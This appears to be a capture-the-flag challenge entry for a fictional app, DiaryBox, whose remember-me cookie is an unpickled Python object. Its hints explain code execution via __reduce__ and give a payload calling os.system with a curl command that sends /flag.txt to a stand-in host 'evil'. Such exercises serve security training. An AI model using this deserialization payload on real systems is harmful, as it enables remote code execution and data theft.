title: Insecure Deserialization
description: DiaryBox's remember-me cookie is a base64 Python pickle. Forge a payload that executes code on the server and exfiltrate /flag.txt.

hints.text: pickle.loads on attacker-controlled bytes is RCE by design — implement __reduce__ on a class you pickle, set the cookie, hit the app.
Your __reduce__ can return (os.system, ('curl -s evil/$(cat /flag.txt)',)) — or simpler, write the flag to a file the app already exposes and read it back via /whoami once the unpickle ran.
